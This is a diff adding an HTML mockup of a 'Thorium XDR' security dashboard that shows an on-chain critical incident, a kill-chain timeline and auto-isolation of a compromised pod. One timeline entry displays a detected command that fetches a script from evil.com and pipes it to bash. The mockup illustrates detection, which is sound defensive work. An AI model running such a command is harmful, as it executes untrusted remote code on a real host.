@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Thorium XDR — CC* Critical Alert (mockup)</title>
+<style>
+  :root{
+    --bg-0:#0a0e1a;--bg-1:#0f1424;--bg-2:#161c2e;--bg-3:#1d2436;
+    --border:rgba(255,255,255,.08);--border-strong:rgba(255,255,255,.14);
+    --text-0:#f1f5f9;--text-1:#94a3b8;--text-2:#64748b;
+    --accent:#38bdf8;--accent-2:#5eead4;
+    --crit:#ef4444;--high:#f97316;--warn:#f59e0b;--ok:#22c55e;
+    --mono:ui-monospace,"JetBrains Mono",Menlo,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:radial-gradient(1200px 600px at 80% -10%,#10203a 0,var(--bg-0) 60%);
+    color:var(--text-0);min-height:100vh}
+  .topbar{height:56px;display:flex;align-items:center;gap:16px;padding:0 20px;
+    border-bottom:1px solid var(--border);background:rgba(15,20,36,.7);backdrop-filter:blur(8px)}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.2px}
+  .logo .mark{width:24px;height:24px;border-radius:6px;
+    background:conic-gradient(from 200deg,var(--accent),var(--accent-2),var(--accent));
+    box-shadow:0 0 16px rgba(56,189,248,.5)}
+  .logo .x{color:var(--accent)}
+  .chip{font-size:12px;color:var(--text-1);border:1px solid var(--border);border-radius:999px;
+    padding:4px 10px;display:flex;align-items:center;gap:6px}
+  .chip .dot{width:7px;height:7px;border-radius:50%;background:var(--accent-2);box-shadow:0 0 8px var(--accent-2)}
+  .mono{font-family:var(--mono)}
+  .grow{flex:1}
+  .ghost{font-size:13px;color:var(--text-1);border:1px solid var(--border);border-radius:8px;padding:7px 12px;background:transparent}
+
+  /* CC* critical banner */
+  .banner{display:flex;align-items:center;gap:14px;margin:14px 20px;padding:14px 16px;border-radius:12px;
+    background:rgba(20,12,16,.92);border:1px solid rgba(239,68,68,.55);border-left:4px solid var(--crit);
+    box-shadow:0 0 0 1px rgba(239,68,68,.12),0 14px 40px rgba(239,68,68,.18);
+    animation:slidein .45s cubic-bezier(.2,.8,.2,1) both}
+  @keyframes slidein{from{opacity:0;transform:translateY(-10px);box-shadow:0 0 0 0 rgba(239,68,68,.6)}
+    to{opacity:1;transform:translateY(0)}}
+  .pulse{position:relative;width:12px;height:12px;border-radius:50%;background:var(--crit);flex:none}
+  .pulse::after{content:"";position:absolute;inset:-6px;border-radius:50%;border:2px solid var(--crit);
+    animation:p .9s ease-out infinite;opacity:.0}
+  @keyframes p{0%{transform:scale(.5);opacity:.8}100%{transform:scale(2);opacity:0}}
+  .banner .sev{font-weight:800;color:#fecaca;letter-spacing:.4px;font-size:12px;display:flex;gap:8px;align-items:center}
+  .banner .was{font-weight:700;color:#86efac;background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);
+    border-radius:999px;padding:1px 8px;font-size:10px;text-decoration:line-through;opacity:.85}
+  .banner .speed{font-weight:800;color:#fde68a;background:rgba(245,158,11,.14);border:1px solid rgba(245,158,11,.4);
+    border-radius:999px;padding:2px 9px;font-size:11px;letter-spacing:.3px;white-space:nowrap}
+  .banner .msg{font-size:14px;color:#fee2e2}
+  .banner .msg b{color:#fff}
+  .cta{margin-left:auto;display:flex;gap:8px;align-items:center}
+  .btn{font-size:13px;font-weight:600;border-radius:9px;padding:8px 14px;border:1px solid transparent;cursor:pointer}
+  .btn-crit{background:var(--crit);color:#fff;box-shadow:0 6px 18px rgba(239,68,68,.35)}
+  .btn-quiet{background:rgba(255,255,255,.06);color:var(--text-0);border-color:var(--border-strong)}
+
+  .layout{display:grid;grid-template-columns:1fr 420px;gap:16px;padding:6px 20px 24px}
+  .panel{background:var(--bg-1);border:1px solid var(--border);border-radius:14px}
+  .panel h3{margin:0;padding:14px 16px;font-size:14px;border-bottom:1px solid var(--border);color:var(--text-1);font-weight:600}
+  .kpis{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}
+  .kpi{background:var(--bg-1);border:1px solid var(--border);border-radius:14px;padding:14px 16px}
+  .kpi .v{font-size:26px;font-weight:700;margin-top:4px}
+  .kpi .t{font-size:12px;color:var(--text-2);text-transform:uppercase;letter-spacing:.5px}
+  .kpi.bad{background:linear-gradient(135deg,rgba(239,68,68,.10),rgba(239,68,68,.02));
+    border:1.5px solid rgba(239,68,68,.4);box-shadow:0 0 18px rgba(239,68,68,.16)}
+  .kpi.bad .v{color:var(--crit);font-size:32px;letter-spacing:-.5px}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  td,th{padding:11px 16px;text-align:left;border-bottom:1px solid var(--border)}
+  th{font-size:11px;color:var(--text-2);text-transform:uppercase;letter-spacing:.5px;font-weight:600}
+  tr:last-child td{border-bottom:none}
+  .badge{font-size:11px;font-weight:700;padding:3px 9px;border-radius:999px;display:inline-flex;align-items:center;gap:6px}
+  .b-ok{background:rgba(34,197,94,.14);color:#86efac}
+  .b-bad{background:rgba(239,68,68,.2);color:#fecaca;border:none;font-weight:700;box-shadow:0 0 14px rgba(239,68,68,.3)}
+  .b-bad .pulse{width:7px;height:7px}
+  .row-bad{background:linear-gradient(90deg,rgba(239,68,68,.08),transparent)}
+  .spark{height:22px}
+
+  /* drawer */
+  .drawer{background:var(--bg-1);border:1px solid var(--border-strong);border-radius:14px;overflow:hidden;
+    box-shadow:-20px 0 50px rgba(0,0,0,.5)}
+  .drawer .head{padding:16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;
+    position:sticky;top:0;z-index:10;background:var(--bg-2);box-shadow:0 2px 8px rgba(0,0,0,.3)}
+  .drawer .head .mono{background:rgba(56,189,248,.08);border:1px solid rgba(56,189,248,.3);border-radius:6px;padding:2px 7px}
+  .drawer .head .sev{font-size:11px;font-weight:800;color:#fff;background:var(--crit);padding:3px 8px;border-radius:6px}
+  .drawer .body{padding:16px;max-height:none}
+  .tl{position:relative;margin:6px 0 16px;padding-left:22px}
+  .tl::before{content:"";position:absolute;left:7px;top:4px;bottom:4px;width:2px;background:var(--border-strong)}
+  .ev{position:relative;padding:8px 0}
+  .ev::before{content:"";position:absolute;left:-19px;top:12px;width:10px;height:10px;border-radius:50%;background:var(--text-2)}
+  .ev.ok::before{background:var(--ok);box-shadow:0 0 8px var(--ok)}
+  .ev.bad::before{background:var(--crit);box-shadow:0 0 8px var(--crit)}
+  .ev.bad{background:rgba(239,68,68,.06);border-left:2px solid rgba(239,68,68,.4);padding-left:10px;margin-left:-10px;border-radius:0 8px 8px 0}
+  .ev.climax{background:rgba(239,68,68,.12);border-left:3px solid var(--crit)}
+  .ev.climax .h{color:#fecaca}
+  .ev .h{font-size:13px;font-weight:600}
+  .ev .s{font-size:12px;color:var(--text-2);font-family:var(--mono)}
+  .ev .t{font-size:11px;color:var(--text-2)}
+  .evid{font-family:var(--mono);font-size:11px;color:var(--accent);background:rgba(56,189,248,.08);
+    border:1px solid rgba(56,189,248,.2);border-radius:6px;padding:8px 10px;margin:4px 0 14px;word-break:break-all}
+  .actions{display:grid;gap:8px}
+  .resp{display:flex;align-items:center;gap:10px;padding:10px 12px;border:1px solid var(--border);border-radius:10px;background:var(--bg-2)}
+  .resp .i{width:26px;height:26px;border-radius:7px;background:var(--bg-3);display:grid;place-items:center;font-size:14px}
+  .resp .l{font-size:13px;font-weight:600}
+  .resp .soon{margin-left:auto;font-size:10px;font-weight:700;color:#fde68a;background:rgba(245,158,11,.15);
+    border:1px solid rgba(245,158,11,.35);padding:2px 7px;border-radius:999px}
+  .section-label{font-size:11px;color:var(--text-2);text-transform:uppercase;letter-spacing:.5px;margin:4px 0 8px;font-weight:700}
+</style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="logo"><span class="mark"></span>Thorium <span class="x">XDR</span></div>
+    <div class="chip"><span class="dot"></span> Sui Testnet · <span class="mono">0x0cc3…91af</span></div>
+    <div class="grow"></div>
+    <button class="ghost">⌘K Search</button>
+    <button class="ghost">Connect Wallet</button>
+  </div>
+
+  <div class="banner">
+    <span class="pulse"></span>
+    <div>
+      <div class="sev">CRITICAL · ON-CHAIN INCIDENT <span class="was">✓ Healthy 40s ago</span></div>
+      <div class="msg"><b>Kernel exploit</b> on observed pod <b>alma9-edge-01</b> · anomaly <b>0.91</b> · marked <b>NOT WORTHY</b> &amp; auto-isolated on Sui</div>
+    </div>
+    <div class="cta">
+      <span class="speed">⚡ Auto-isolated in 2s</span>
+      <button class="btn btn-quiet">Mute</button>
+      <button class="btn btn-crit">View incident →</button>
+    </div>
+  </div>
+
+  <div class="layout">
+    <div>
+      <div class="kpis">
+        <div class="kpi"><div class="t">Active Agents</div><div class="v">23</div></div>
+        <div class="kpi bad"><div class="t">Critical Threats</div><div class="v">1</div></div>
+        <div class="kpi"><div class="t">Pods Observed</div><div class="v">24</div></div>
+      </div>
+      <div class="panel">
+        <h3>Monitored Endpoints (SBT)</h3>
+        <table>
+          <tr><th>Observed Pod</th><th>Telemetry</th><th>Status</th><th>On-chain</th></tr>
+          <tr class="row-bad">
+            <td><b>alma9-edge-01</b><br><span class="mono" style="color:var(--text-2);font-size:11px">0x1a2b…3c4d</span></td>
+            <td><svg class="spark" viewBox="0 0 120 22" preserveAspectRatio="none"><polyline points="0,16 20,15 40,14 60,15 80,4 100,3 120,2" fill="none" stroke="#ef4444" stroke-width="2"/></svg></td>
+            <td><span class="badge b-bad"><span class="pulse"></span>NOT WORTHY</span></td>
+            <td><span class="mono" style="font-size:11px;color:var(--text-2)">is_active=false</span></td>
+          </tr>
+          <tr>
+            <td>ws-07<br><span class="mono" style="color:var(--text-2);font-size:11px">0x4b5c…6a7b</span></td>
+            <td><svg class="spark" viewBox="0 0 120 22" preserveAspectRatio="none"><polyline points="0,14 20,13 40,15 60,12 80,13 100,11 120,12" fill="none" stroke="#22c55e" stroke-width="2"/></svg></td>
+            <td><span class="badge b-ok">Healthy</span></td>
+            <td><span class="mono" style="font-size:11px;color:var(--text-2)">is_active=true</span></td>
+          </tr>
+          <tr>
+            <td>db-02<br><span class="mono" style="color:var(--text-2);font-size:11px">0x9f8e…7d6c</span></td>
+            <td><svg class="spark" viewBox="0 0 120 22" preserveAspectRatio="none"><polyline points="0,15 20,14 40,13 60,14 80,12 100,13 120,11" fill="none" stroke="#22c55e" stroke-width="2"/></svg></td>
+            <td><span class="badge b-ok">Healthy</span></td>
+            <td><span class="mono" style="font-size:11px;color:var(--text-2)">is_active=true</span></td>
+          </tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="drawer">
+      <div class="head">
+        <span class="sev">CRITICAL</span>
+        <div><div style="font-weight:700">Incident Command</div>
+          <div class="mono" style="font-size:11px;color:var(--text-2)">INC-991 · alma9-edge-01</div></div>
+      </div>
+      <div class="body">
+        <div class="section-label">Kill-chain timeline</div>
+        <div class="tl">
+          <div class="ev ok"><div class="h">Pod connected & attested</div><div class="s">register_agent → AgentRegistered</div><div class="t">14:02:11</div></div>
+          <div class="ev ok"><div class="h">Healthy — Sui interaction OK</div><div class="s">TelemetryReported cpu 12% · ram 38%</div><div class="t">14:02–14:40</div></div>
+          <div class="ev bad"><div class="h">Kernel exploit / DDoS detected</div><div class="s">eBPF execve: curl -s http://evil.com/sh | bash</div><div class="t">14:41:03</div></div>
+          <div class="ev bad"><div class="h">AI classified anomaly 0.91 ≥ 0.85</div><div class="s">ClassificationReported → TRIGGER_ISOLATION</div><div class="t">14:41:04</div></div>
+          <div class="ev bad climax"><div class="h">Marked NOT WORTHY · isolated</div><div class="s">IncidentReport CRITICAL · is_active=false</div><div class="t">14:41:05 · ⚡ 2s after detection</div></div>
+        </div>
+        <div class="section-label">On-chain evidence</div>
+        <div class="evid">tx 0x9aBcDeF…01 · IncidentReport{severity:"CRITICAL", action_taken:"KILLED_AND_ISOLATED"}</div>
+        <div class="section-label">Response — recommended actions</div>
+        <div class="actions">
+          <div class="resp"><span class="i">📟</span><span class="l">Notify on-call</span><span class="soon">Coming soon</span></div>
+          <div class="resp"><span class="i">💬</span><span class="l">Post to Slack #sec-incidents</span><span class="soon">Coming soon</span></div>
+          <div class="resp"><span class="i">🧊</span><span class="l">Freeze ports · isolate · kill in cloud</span><span class="soon">Coming soon</span></div>
+          <div class="resp"><span class="i">🤖</span><span class="l">Execute skill / connect Claude Code</span><span class="soon">Coming soon</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
